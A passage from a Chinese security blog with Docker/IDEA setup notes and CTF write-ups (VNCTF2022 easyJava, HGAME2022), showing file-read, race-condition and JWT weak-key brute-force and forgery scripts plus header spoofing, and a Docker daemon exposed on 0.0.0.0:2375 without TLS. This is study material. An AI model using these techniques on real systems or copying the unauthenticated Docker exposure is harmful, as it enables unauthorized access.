<p><a href="http://t.zoukankan.com/caoleiCoding-p-12874907.html">http://t.zoukankan.com/caoleiCoding-p-12874907.html</a></p>
</blockquote>
<h3 id="DOCKER"><a href="#DOCKER" class="headerlink" title="DOCKER"></a>DOCKER</h3><p>首先要在docker desktop下修改如下设置：</p>
<ul>
<li><p>General: Expose daemon on tcp://localhost:2375 without TLS</p>
</li>
<li><p>Docker Engine的配置文件的json添加:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;hosts&quot;: [</span><br><span class="line">    &quot;tcp://0.0.0.0:2375&quot;</span><br><span class="line">  ],</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>配置防火墙打开2375端口，用管理员身份去运行powershell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;docker_daemon&quot; dir=in action=allow protocol=TCP localport=2375</span><br></pre></td></tr></table></figure>
<p>测试：<code>docker -H 127.0.0.1:2375 info</code></p>
<blockquote>
<p><a href="https://baijiahao.baidu.com/s?id=1652188442217820964&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1652188442217820964&amp;wfr=spider&amp;for=pc</a></p>
</blockquote>
<h3 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h3><p>Settings-&gt;Build-&gt;Build tools-&gt;Maven-&gt;runner中的<code>VM Options</code>:<code>-DarchetypeCatalog=internal</code></p>
<p>可以在没有网路的情况下，我们可以正常创建工程，并从之前已经使用过的工程中找到相应的骨架。</p>
<p>比较坑的就是在idea新建项目的时候要选用linux文件系统，不要偷懒想通过<code>/mnt/c</code>直接套用windows的文件系统，文件路径为<code>\\wsl$</code></p>
<p>Settings-&gt;Build-&gt;Docker,添加，选择TCP socket，tcp://localhost:2375，检查是否能链接成功。</p>
<p><img src="/2022/01/17/JavaWeb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/assets/image-20220214002132356.png" alt="image-20220214002132356"></p>
<p>好像也没啥用，也不知道为啥自己会闲的蛋疼自己搭一个这种环境。</p>
<h1 id="刷题笔记"><a href="#刷题笔记" class="headerlink" title="刷题笔记"></a>刷题笔记</h1><h3 id="VNCTF2022-easyJava"><a href="#VNCTF2022-easyJava" class="headerlink" title="VNCTF2022 easyJava"></a>VNCTF2022 easyJava</h3><p>vn有事没打，比赛后赶紧做了一下</p>
<p>首先用file协议拿到任意文件读权限,这个还挺贴心，相当于ls。</p>
<p><img src="/2022/01/17/JavaWeb%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/assets/image-20220214124845926.png" alt="image-20220214124845926"></p>
<p>读取<code>/proc/self/environ</code>发现工作目录是在<code>/usr/local/tomcat/</code>下，往下依次拿到class文件，反编译。</p>
<p>依次阅读，HelloWorldServlet处错误使用成员变量，可以通过条件竞争绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://dde0389e-bd53-41f5-800f-a174d70b2983.node4.buuoj.cn:81/evi1?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;The Key is&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            event.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">        threading.Thread(target=read,args=(<span class="string">&quot;wonendie&quot;</span>,)).start()</span><br><span class="line">        threading.Thread(target=read,args=(<span class="string">&quot;vnctf2022&quot;</span>,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">The Key is emLCF6YoH9P0TiQ4UD9alVvN49paCVfC</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>拿到key后就老老实实序列化即可，注意package也要相同，因为这个还卡了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name = <span class="string">&quot;m4n_q1u_666&quot;</span>;</span><br><span class="line">String age = <span class="string">&quot;666&quot;</span>;</span><br><span class="line">String height = <span class="string">&quot;180&quot;</span>;</span><br><span class="line">User user = <span class="keyword">new</span> User(name, age, height);</span><br><span class="line"><span class="keyword">byte</span>[] textByte = SerAndDe.serialize(user);</span><br><span class="line">Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">String res = encoder.encodeToString(textByte);</span><br><span class="line">System.out.println(res);</span><br></pre></td></tr></table></figure>
<h1 id="推荐链接"><a href="#推荐链接" class="headerlink" title="推荐链接"></a>推荐链接</h1><blockquote>
<p><a href="https://xz.aliyun.com/t/7945#toc-27">java代码审计 - 先知社区 (aliyun.com)</a> 总结超全的一篇博客</p>
</blockquote>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame2022</title>
    <url>/2022/01/21/hgame2022/</url>
    <content><![CDATA[<p>寒假战队带学弟入门，随便做着玩玩的</p>
<span id="more"></span>
<h1 id="HGAME2022"><a href="#HGAME2022" class="headerlink" title="HGAME2022"></a>HGAME2022</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="easy-auth"><a href="#easy-auth" class="headerlink" title="easy_auth"></a>easy_auth</h4><p>根据题目描述要admin登进去，阅读<code>app.js</code>代码发现是用jwt进行的身份认证，介于是week1的简单题，没必要想的那么复杂，先尝试把algorithm改成None后无效，那就爆弱口令密钥，网上找了个top10000,脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">jwt_str = <span class="string">&#x27;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MzUwLCJVc2VyTmFtZSI6ImFkbWluJyBvciAxMDAwMD0xMDAwMCMiLCJQaG9uZSI6IiIsIkVtYWlsIjoiIiwiZXhwIjoxNjQyNzMyMTQ1LCJpc3MiOiJNSmNsb3VkcyJ9._VVQjP4wTBYNes1cWiIaNTTidLwirfaFA9pnqsC-eQ8&#x27;</span></span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;弱口令top10000.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines():</span><br><span class="line">    line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(line)</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=line)</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">len</span>(line))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">        <span class="built_in">print</span>(line)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>爆出来密钥为空，所以伪造jwt:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&quot;ID&quot;</span>:<span class="number">1</span>,<span class="string">&quot;UserName&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;Phone&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;Email&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;exp&quot;</span>:<span class="number">1642732145</span>,<span class="string">&quot;iss&quot;</span>:<span class="string">&quot;MJclouds&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(<span class="built_in">dict</span>, <span class="string">&#x27;&#x27;</span>, algorithm=<span class="string">&#x27;HS256&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>然后到控制台里把token改了就能拿flag了。<code>localStorage.setItem(&#39;token&#39;,value)</code></p>
<h4 id="蛛蛛…嘿嘿♥我的蛛蛛"><a href="#蛛蛛…嘿嘿♥我的蛛蛛" class="headerlink" title="蛛蛛…嘿嘿♥我的蛛蛛"></a>蛛蛛…嘿嘿♥我的蛛蛛</h4><p>爬虫题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">&#x27;https://hgame-spider.vidar.club/b7412bb0b0&#x27;</span></span><br><span class="line">now = <span class="string">&#x27;?key=M7H8z1oG%2B1SaPudvsDf7GEm%2F9hyalx2liQ6X2mBSz4iXDqmZwkyLTWPY02GWc5OZf%2F9zO73pRTg3XdoyjfgY3g%3D%3D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = requests.get(url + now)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        now = re.search(<span class="string">r&#x27;\?key=.*?&quot;&#x27;</span>, r.text)[<span class="number">0</span>][:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(now)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>到最后一关查看header就有flag</p>
<h4 id="Tetris-plus"><a href="#Tetris-plus" class="headerlink" title="Tetris plus"></a>Tetris plus</h4><p>一个个翻js，长度最长的那个用js运行一下就是flag</p>
<h4 id="Fujiwara-Tofu-Shop"><a href="#Fujiwara-Tofu-Shop" class="headerlink" title="Fujiwara Tofu Shop"></a>Fujiwara Tofu Shop</h4><p>一个个改请求头就ok</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: game.summ3r.top</span><br><span class="line">User-Agent: Hachi-Roku</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Gasoline: 100</span><br><span class="line">Cookie: flavor=Raspberry;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Referer: qiumingshan.net</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><h4 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy RSA"></a>Easy RSA</h4><p>脚本随手删了</p>
<h4 id="English-Novel"><a href="#English-Novel" class="headerlink" title="English Novel"></a>English Novel</h4><p>暴力匹配出对应的，然后挨个算出key爆flag即可，最后的flag还得手动改改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">origin_name = <span class="string">&#x27;original/part%d.txt&#x27;</span></span><br><span class="line">encrypt_name = <span class="string">&#x27;encrypt/part%d.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_map</span>():</span></span><br><span class="line">    mapping = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">410</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">410</span>):</span><br><span class="line">            f1 = <span class="built_in">open</span>(encrypt_name % i, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            f2 = <span class="built_in">open</span>(origin_name % j, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            content1 = f1.read()</span><br><span class="line">            content2 = f2.read()</span><br><span class="line">            f1.close()</span><br><span class="line">            f2.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(content1) != <span class="built_in">len</span>(content2):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ok = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content1)):</span><br><span class="line">                <span class="keyword">if</span> content1[k].isalpha() != content2[k].isalpha():</span><br><span class="line">                    ok = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> content1[k].isalpha() == <span class="literal">False</span> <span class="keyword">and</span> content1[k] != content2[k]:</span><br><span class="line">                    ok = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> ok == <span class="number">0</span>:</span><br><span class="line">                mapping[i] = j</span><br><span class="line">                <span class="built_in">print</span>(i, <span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> mapping</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">data, key</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(data) &lt;= <span class="built_in">len</span>(key)</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        <span class="keyword">if</span> data[i].isupper():</span><br><span class="line">            result += <span class="built_in">chr</span>((<span class="built_in">ord</span>(data[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + key[i]) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">        <span class="keyword">elif</span> data[i].islower():</span><br><span class="line">            result += <span class="built_in">chr</span>((<span class="built_in">ord</span>(data[i]) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + key[i]) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result += data[i]</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mapping = &#123;<span class="number">0</span>: <span class="number">194</span>, <span class="number">1</span>: <span class="number">375</span>, <span class="number">2</span>: <span class="number">276</span>, <span class="number">3</span>: <span class="number">133</span>, <span class="number">4</span>: <span class="number">394</span>, <span class="number">5</span>: <span class="number">243</span>, <span class="number">6</span>: <span class="number">66</span>, <span class="number">7</span>: <span class="number">145</span>, <span class="number">8</span>: <span class="number">123</span>, <span class="number">9</span>: <span class="number">283</span>, <span class="number">10</span>: <span class="number">291</span>, <span class="number">11</span>: <span class="number">68</span>, <span class="number">12</span>: <span class="number">326</span>, <span class="number">13</span>: <span class="number">297</span>, <span class="number">14</span>: <span class="number">300</span>, <span class="number">15</span>: <span class="number">171</span>, <span class="number">16</span>: <span class="number">320</span>, <span class="number">17</span>: <span class="number">324</span>, <span class="number">18</span>: <span class="number">224</span>, <span class="number">19</span>: <span class="number">311</span>, <span class="number">20</span>: <span class="number">39</span>, <span class="number">21</span>: <span class="number">329</span>, <span class="number">22</span>: <span class="number">356</span>, <span class="number">23</span>: <span class="number">279</span>, <span class="number">24</span>: <span class="number">334</span>, <span class="number">25</span>: <span class="number">368</span>, <span class="number">26</span>: <span class="number">182</span>, <span class="number">27</span>: <span class="number">241</span>, <span class="number">28</span>: <span class="number">398</span>, <span class="number">29</span>: <span class="number">121</span>, <span class="number">30</span>: <span class="number">77</span>, <span class="number">31</span>: <span class="number">387</span>, <span class="number">32</span>: <span class="number">345</span>, <span class="number">33</span>: <span class="number">80</span>, <span class="number">34</span>: <span class="number">17</span>, <span class="number">35</span>: <span class="number">204</span>, <span class="number">36</span>: <span class="number">344</span>, <span class="number">37</span>: <span class="number">159</span>, <span class="number">38</span>: <span class="number">34</span>, <span class="number">39</span>: <span class="number">272</span>, <span class="number">40</span>: <span class="number">256</span>, <span class="number">41</span>: <span class="number">127</span>, <span class="number">42</span>: <span class="number">245</span>, <span class="number">43</span>: <span class="number">43</span>, <span class="number">44</span>: <span class="number">221</span>, <span class="number">45</span>: <span class="number">138</span>, <span class="number">46</span>: <span class="number">379</span>, <span class="number">47</span>: <span class="number">64</span>, <span class="number">48</span>: <span class="number">141</span>, <span class="number">49</span>: <span class="number">253</span>, <span class="number">50</span>: <span class="number">143</span>, <span class="number">51</span>: <span class="number">75</span>, <span class="number">52</span>: <span class="number">328</span>, <span class="number">53</span>: <span class="number">29</span>, <span class="number">54</span>: <span class="number">180</span>, <span class="number">55</span>: <span class="number">217</span>, <span class="number">56</span>: <span class="number">350</span>, <span class="number">57</span>: <span class="number">323</span>, <span class="number">58</span>: <span class="number">186</span>, <span class="number">59</span>: <span class="number">301</span>, <span class="number">60</span>: <span class="number">36</span>, <span class="number">61</span>: <span class="number">389</span>, <span class="number">62</span>: <span class="number">336</span>, <span class="number">63</span>: <span class="number">349</span>, <span class="number">64</span>: <span class="number">72</span>, <span class="number">65</span>: <span class="number">335</span>, <span class="number">66</span>: <span class="number">327</span>, <span class="number">67</span>: <span class="number">396</span>, <span class="number">68</span>: <span class="number">268</span>, <span class="number">69</span>: <span class="number">58</span>, <span class="number">70</span>: <span class="number">284</span>, <span class="number">71</span>: <span class="number">202</span>, <span class="number">72</span>: <span class="number">20</span>, <span class="number">73</span>: <span class="number">392</span>, <span class="number">74</span>: <span class="number">142</span>, <span class="number">75</span>: <span class="number">244</span>, <span class="number">76</span>: <span class="number">67</span>, <span class="number">77</span>: <span class="number">179</span>, <span class="number">78</span>: <span class="number">147</span>, <span class="number">79</span>: <span class="number">190</span>, <span class="number">80</span>: <span class="number">254</span>, <span class="number">81</span>: <span class="number">228</span>, <span class="number">82</span>: <span class="number">265</span>, <span class="number">83</span>: <span class="number">30</span>, <span class="number">84</span>: <span class="number">45</span>, <span class="number">85</span>: <span class="number">62</span>, <span class="number">86</span>: <span class="number">109</span>, <span class="number">87</span>: <span class="number">120</span>, <span class="number">88</span>: <span class="number">92</span>, <span class="number">89</span>: <span class="number">230</span>, <span class="number">90</span>: <span class="number">65</span>, <span class="number">91</span>: <span class="number">382</span>, <span class="number">92</span>: <span class="number">137</span>, <span class="number">93</span>: <span class="number">312</span>, <span class="number">94</span>: <span class="number">205</span>, <span class="number">95</span>: <span class="number">14</span>, <span class="number">96</span>: <span class="number">1</span>, <span class="number">97</span>: <span class="number">362</span>, <span class="number">98</span>: <span class="number">26</span>, <span class="number">99</span>: <span class="number">260</span>, <span class="number">100</span>: <span class="number">288</span>, <span class="number">101</span>: <span class="number">191</span>, <span class="number">102</span>: <span class="number">118</span>, <span class="number">103</span>: <span class="number">94</span>, <span class="number">104</span>: <span class="number">176</span>, <span class="number">105</span>: <span class="number">262</span>, <span class="number">106</span>: <span class="number">197</span>, <span class="number">107</span>: <span class="number">35</span>, <span class="number">108</span>: <span class="number">149</span>, <span class="number">109</span>: <span class="number">53</span>, <span class="number">110</span>: <span class="number">367</span>, <span class="number">111</span>: <span class="number">42</span>, <span class="number">112</span>: <span class="number">361</span>, <span class="number">113</span>: <span class="number">187</span>, <span class="number">114</span>: <span class="number">59</span>, <span class="number">115</span>: <span class="number">57</span>, <span class="number">116</span>: <span class="number">213</span>, <span class="number">117</span>: <span class="number">95</span>, <span class="number">118</span>: <span class="number">48</span>, <span class="number">119</span>: <span class="number">408</span>, <span class="number">120</span>: <span class="number">378</span>, <span class="number">121</span>: <span class="number">313</span>, <span class="number">122</span>: <span class="number">175</span>, <span class="number">123</span>: <span class="number">371</span>, <span class="number">124</span>: <span class="number">98</span>, <span class="number">125</span>: <span class="number">155</span>, <span class="number">126</span>: <span class="number">40</span>, <span class="number">127</span>: <span class="number">97</span>, <span class="number">128</span>: <span class="number">200</span>, <span class="number">129</span>: <span class="number">70</span>, <span class="number">130</span>: <span class="number">281</span>, <span class="number">131</span>: <span class="number">364</span>, <span class="number">132</span>: <span class="number">402</span>, <span class="number">133</span>: <span class="number">41</span>, <span class="number">134</span>: <span class="number">108</span>, <span class="number">135</span>: <span class="number">63</span>, <span class="number">136</span>: <span class="number">267</span>, <span class="number">137</span>: <span class="number">24</span>, <span class="number">138</span>: <span class="number">100</span>, <span class="number">139</span>: <span class="number">83</span>, <span class="number">140</span>: <span class="number">74</span>, <span class="number">141</span>: <span class="number">156</span>, <span class="number">142</span>: <span class="number">403</span>, <span class="number">143</span>: <span class="number">295</span>, <span class="number">144</span>: <span class="number">49</span>, <span class="number">145</span>: <span class="number">93</span>, <span class="number">146</span>: <span class="number">237</span>, <span class="number">147</span>: <span class="number">307</span>, <span class="number">148</span>: <span class="number">28</span>, <span class="number">149</span>: <span class="number">144</span>, <span class="number">150</span>: <span class="number">353</span>, <span class="number">151</span>: <span class="number">309</span>, <span class="number">152</span>: <span class="number">352</span>, <span class="number">153</span>: <span class="number">196</span>, <span class="number">154</span>: <span class="number">207</span>, <span class="number">155</span>: <span class="number">69</span>, <span class="number">156</span>: <span class="number">82</span>, <span class="number">157</span>: <span class="number">401</span>, <span class="number">158</span>: <span class="number">86</span>, <span class="number">159</span>: <span class="number">177</span>, <span class="number">160</span>: <span class="number">383</span>, <span class="number">161</span>: <span class="number">278</span>, <span class="number">162</span>: <span class="number">343</span>, <span class="number">163</span>: <span class="number">292</span>, <span class="number">164</span>: <span class="number">293</span>, <span class="number">165</span>: <span class="number">373</span>, <span class="number">166</span>: <span class="number">188</span>, <span class="number">167</span>: <span class="number">206</span>, <span class="number">168</span>: <span class="number">242</span>, <span class="number">169</span>: <span class="number">290</span>, <span class="number">170</span>: <span class="number">116</span>, <span class="number">171</span>: <span class="number">130</span>, <span class="number">172</span>: <span class="number">181</span>, <span class="number">173</span>: <span class="number">56</span>, <span class="number">174</span>: <span class="number">219</span>, <span class="number">175</span>: <span class="number">0</span>, <span class="number">176</span>: <span class="number">214</span>, <span class="number">177</span>: <span class="number">365</span>, <span class="number">178</span>: <span class="number">195</span>, <span class="number">179</span>: <span class="number">13</span>, <span class="number">180</span>: <span class="number">173</span>, <span class="number">181</span>: <span class="number">325</span>, <span class="number">182</span>: <span class="number">263</span>, <span class="number">183</span>: <span class="number">318</span>, <span class="number">184</span>: <span class="number">81</span>, <span class="number">185</span>: <span class="number">153</span>, <span class="number">186</span>: <span class="number">388</span>, <span class="number">187</span>: <span class="number">172</span>, <span class="number">188</span>: <span class="number">114</span>, <span class="number">189</span>: <span class="number">152</span>, <span class="number">190</span>: <span class="number">359</span>, <span class="number">191</span>: <span class="number">305</span>, <span class="number">192</span>: <span class="number">9</span>, <span class="number">193</span>: <span class="number">239</span>, <span class="number">194</span>: <span class="number">52</span>, <span class="number">195</span>: <span class="number">319</span>, <span class="number">196</span>: <span class="number">274</span>, <span class="number">197</span>: <span class="number">174</span>, <span class="number">198</span>: <span class="number">232</span>, <span class="number">199</span>: <span class="number">255</span>, <span class="number">200</span>: <span class="number">346</span>, <span class="number">201</span>: <span class="number">218</span>, <span class="number">202</span>: <span class="number">363</span>, <span class="number">203</span>: <span class="number">269</span>, <span class="number">204</span>: <span class="number">47</span>, <span class="number">205</span>: <span class="number">222</span>, <span class="number">206</span>: <span class="number">104</span>, <span class="number">207</span>: <span class="number">315</span>, <span class="number">208</span>: <span class="number">227</span>, <span class="number">209</span>: <span class="number">132</span>, <span class="number">210</span>: <span class="number">211</span>, <span class="number">211</span>: <span class="number">270</span>, <span class="number">212</span>: <span class="number">161</span>, <span class="number">213</span>: <span class="number">354</span>, <span class="number">214</span>: <span class="number">407</span>, <span class="number">215</span>: <span class="number">282</span>, <span class="number">216</span>: <span class="number">154</span>, <span class="number">217</span>: <span class="number">55</span>, <span class="number">218</span>: <span class="number">103</span>, <span class="number">219</span>: <span class="number">376</span>, <span class="number">220</span>: <span class="number">128</span>, <span class="number">221</span>: <span class="number">106</span>, <span class="number">222</span>: <span class="number">78</span>, <span class="number">223</span>: <span class="number">148</span>, <span class="number">224</span>: <span class="number">135</span>, <span class="number">225</span>: <span class="number">90</span>, <span class="number">226</span>: <span class="number">89</span>, <span class="number">227</span>: <span class="number">257</span>, <span class="number">228</span>: <span class="number">110</span>, <span class="number">229</span>: <span class="number">33</span>, <span class="number">230</span>: <span class="number">216</span>, <span class="number">231</span>: <span class="number">347</span>, <span class="number">232</span>: <span class="number">249</span>, <span class="number">233</span>: <span class="number">400</span>, <span class="number">234</span>: <span class="number">2</span>, <span class="number">235</span>: <span class="number">302</span>, <span class="number">236</span>: <span class="number">275</span>, <span class="number">237</span>: <span class="number">23</span>, <span class="number">238</span>: <span class="number">208</span>, <span class="number">239</span>: <span class="number">79</span>, <span class="number">240</span>: <span class="number">151</span>, <span class="number">241</span>: <span class="number">310</span>, <span class="number">242</span>: <span class="number">60</span>, <span class="number">243</span>: <span class="number">348</span>, <span class="number">244</span>: <span class="number">184</span>, <span class="number">245</span>: <span class="number">252</span>, <span class="number">246</span>: <span class="number">338</span>, <span class="number">247</span>: <span class="number">160</span>, <span class="number">248</span>: <span class="number">185</span>, <span class="number">249</span>: <span class="number">209</span>, <span class="number">250</span>: <span class="number">390</span>, <span class="number">251</span>: <span class="number">163</span>, <span class="number">252</span>: <span class="number">287</span>, <span class="number">253</span>: <span class="number">261</span>, <span class="number">254</span>: <span class="number">102</span>, <span class="number">255</span>: <span class="number">189</span>, <span class="number">256</span>: <span class="number">27</span>, <span class="number">257</span>: <span class="number">146</span>, <span class="number">258</span>: <span class="number">198</span>, <span class="number">259</span>: <span class="number">6</span>, <span class="number">260</span>: <span class="number">126</span>, <span class="number">261</span>: <span class="number">84</span>, <span class="number">262</span>: <span class="number">294</span>, <span class="number">263</span>: <span class="number">381</span>, <span class="number">264</span>: <span class="number">215</span>, <span class="number">265</span>: <span class="number">331</span>, <span class="number">266</span>: <span class="number">226</span>, <span class="number">267</span>: <span class="number">73</span>, <span class="number">268</span>: <span class="number">44</span>, <span class="number">269</span>: <span class="number">115</span>, <span class="number">270</span>: <span class="number">192</span>, <span class="number">271</span>: <span class="number">225</span>, <span class="number">272</span>: <span class="number">91</span>, <span class="number">273</span>: <span class="number">5</span>, <span class="number">274</span>: <span class="number">201</span>, <span class="number">275</span>: <span class="number">399</span>, <span class="number">276</span>: <span class="number">170</span>, <span class="number">277</span>: <span class="number">223</span>, <span class="number">278</span>: <span class="number">16</span>, <span class="number">279</span>: <span class="number">31</span>, <span class="number">280</span>: <span class="number">38</span>, <span class="number">281</span>: <span class="number">317</span>, <span class="number">282</span>: <span class="number">193</span>, <span class="number">283</span>: <span class="number">129</span>, <span class="number">284</span>: <span class="number">134</span>, <span class="number">285</span>: <span class="number">85</span>, <span class="number">286</span>: <span class="number">235</span>, <span class="number">287</span>: <span class="number">340</span>, <span class="number">288</span>: <span class="number">386</span>, <span class="number">289</span>: <span class="number">105</span>, <span class="number">290</span>: <span class="number">101</span>, <span class="number">291</span>: <span class="number">316</span>, <span class="number">292</span>: <span class="number">112</span>, <span class="number">293</span>: <span class="number">259</span>, <span class="number">294</span>: <span class="number">286</span>, <span class="number">295</span>: <span class="number">380</span>, <span class="number">296</span>: <span class="number">107</span>, <span class="number">297</span>: <span class="number">210</span>, <span class="number">298</span>: <span class="number">165</span>, <span class="number">299</span>: <span class="number">405</span>, <span class="number">300</span>: <span class="number">248</span>, <span class="number">301</span>: <span class="number">314</span>, <span class="number">302</span>: <span class="number">322</span>, <span class="number">303</span>: <span class="number">393</span>, <span class="number">304</span>: <span class="number">337</span>, <span class="number">305</span>: <span class="number">333</span>, <span class="number">306</span>: <span class="number">119</span>, <span class="number">307</span>: <span class="number">370</span>, <span class="number">308</span>: <span class="number">406</span>, <span class="number">309</span>: <span class="number">50</span>, <span class="number">310</span>: <span class="number">169</span>, <span class="number">311</span>: <span class="number">99</span>, <span class="number">312</span>: <span class="number">136</span>, <span class="number">313</span>: <span class="number">18</span>, <span class="number">314</span>: <span class="number">113</span>, <span class="number">315</span>: <span class="number">76</span>, <span class="number">316</span>: <span class="number">240</span>, <span class="number">317</span>: <span class="number">271</span>, <span class="number">318</span>: <span class="number">167</span>, <span class="number">319</span>: <span class="number">273</span>, <span class="number">320</span>: <span class="number">88</span>, <span class="number">321</span>: <span class="number">357</span>, <span class="number">322</span>: <span class="number">71</span>, <span class="number">323</span>: <span class="number">10</span>, <span class="number">324</span>: <span class="number">7</span>, <span class="number">325</span>: <span class="number">199</span>, <span class="number">326</span>: <span class="number">21</span>, <span class="number">327</span>: <span class="number">117</span>, <span class="number">328</span>: <span class="number">342</span>, <span class="number">329</span>: <span class="number">372</span>, <span class="number">330</span>: <span class="number">280</span>, <span class="number">331</span>: <span class="number">231</span>, <span class="number">332</span>: <span class="number">166</span>, <span class="number">333</span>: <span class="number">12</span>, <span class="number">334</span>: <span class="number">384</span>, <span 